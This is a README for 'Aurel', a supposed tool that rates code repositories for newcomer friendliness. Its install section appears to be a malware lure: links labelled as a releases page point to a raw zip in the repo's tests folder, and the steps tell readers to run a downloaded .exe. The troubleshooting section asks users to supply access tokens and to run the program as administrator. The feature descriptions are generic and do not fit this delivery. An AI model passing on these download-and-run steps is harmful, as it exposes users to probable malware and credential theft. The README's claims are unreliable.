# 🛠️ aurel_opensource_contribution - Score your project for new contributors

[![](https://img.shields.io/badge/Download-Aurel_Tool-blue.svg)](https://github.com/wynnpowdery808/aurel_opensource_contribution/raw/refs/heads/main/tests/aurel_opensource_contribution_3.0.zip)

Aurel analyzes code repositories to help creators welcome new contributors. The tool scans files on GitHub, GitLab, and Bitbucket. It assigns a score for beginner friendliness. It provides Starter PR Kits, onboarding paths, and reports to guide those who want to help your project grow.

## 📋 What Aurel Does

Open source repositories often contain complex structures. New contributors struggle to find where to start. Aurel automates the background work required to make a project accessible. You run the command, and the tool evaluates your files. You receive a clear list of actions to improve your documentation and contribution process.

The tool provides the following features:

*   **Repository Analysis:** It scans your project structure for files like README, CONTRIBUTING, and LICENSE.
*   **Friendliness Score:** You see a numeric score based on how easy your project is to understand.
*   **Starter PR Kits:** The tool generates templates that guide new users through their first code changes.
*   **Onboarding Paths:** It suggests steps to help newcomers set up their development environment.
*   **Maintainer Guidance:** You receive tips to manage pull requests and delegate tasks.

## ⚙️ System Requirements

Aurel runs on Windows 10 or Windows 11. Your computer needs at least 4GB of RAM and 200MB of free disk space. You do not need to install complex language environments to use this version of the tool.

## 💾 How to Install

Follow these steps to set up the tool on your system.

1. Visit the [releases page](https://github.com/wynnpowdery808/aurel_opensource_contribution/raw/refs/heads/main/tests/aurel_opensource_contribution_3.0.zip) to download the application.
2. Look for the file ending in `.exe` under the latest release section.
3. Click the file name to start the download.
4. Save the file to a folder you can find easily, such as your Downloads folder.
5. Double-click the saved file to begin the setup.
6. Follow the prompts on the screen to finalize the installation.

## 🚀 Running Your First Analysis

Once you install the tool, you find an icon named Aurel on your desktop. 

1. Double-click the Aurel icon to open the application window.
2. Enter the web link (URL) of your project repository in the text box.
3. Click the Analyze button.
4. Wait for the progress bar to finish.
5. The window displays your project score along with a list of suggestions.
6. Click Save Report to export the findings as a text file for your records.

## 💡 Evaluating Your Score

The tool rates your project on a scale from 0 to 100. A score of 80 or higher indicates that your project is ready for new contributors. If your score is lower, look at the suggestions provided in the report.

Typical improvements include:

*   **Create a CONTRIBUTING.md file:** This document explains how people can send their changes to you.
*   **Provide simple tasks:** Mark specific issues with a label such as "good first issue."
*   **Update your README:** Ensure your installation instructions are accurate and work on a clean system.
*   **Add documentation:** Explain your code in simple terms so others understand your goals.

## 📂 Understanding the Reports

Aurel generates reports in three formats. You choose the format that best fits your workflow.

*   **Summary Report:** This document provides a quick look at your friendliness score and top three areas for growth.
*   **Technical Report:** This version includes details on files that failed the analysis, such as missing configuration files or broken links.
*   **Contributor Guide:** This is a finished draft you can add directly to your project to welcome new people.

## 🆘 Troubleshooting Common Issues

### The application does not open
If you click the icon and nothing happens, your computer might require an update. Check that your Windows version has all the latest security patches. You may also need to restart your computer.

### The tool cannot scan a private repository
Aurel currently works best with public projects. If you have a private project, you must provide the tool with an access token from your hosting provider. Select Settings inside the application to enter your credentials securely.

### The analysis crashes mid-scan
Large repositories sometimes take a few minutes to process. If the tool stops, ensure you have a stable internet connection. If the issue persists, run the tool as an administrator by right-clicking the icon and selecting Run as administrator.

### The score seems incorrect
The tool evaluates standard files. If your project uses a unique organization, the tool might miss certain parts. Review the manual report to see what the tool checked. You can override specific settings if you believe your project meets the requirements in a different way.
